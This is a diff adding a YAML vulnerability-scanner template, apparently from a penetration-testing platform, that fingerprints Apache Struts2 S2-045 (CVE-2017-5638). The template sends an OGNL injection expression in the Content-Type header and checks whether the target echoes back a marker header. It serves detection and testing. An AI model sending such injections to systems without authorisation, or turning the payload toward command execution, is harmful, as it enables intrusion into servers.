@@ -1,0 +1,20 @@
+id: local-struts2-s2-045-fingerprint
+
+info:
+  name: Local Struts2 S2-045 Fingerprint (CVE-2017-5638)
+  author: pentest-platform
+  severity: info
+  tags: safe-poc,struts2,s2-045,cve,cve2017,fingerprint
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}"
+    headers:
+      Content-Type: "%{(#_='multipart/form-data').(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-S2-045-Fp','1'))}"
+    body: ""
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "X-S2-045-Fp"
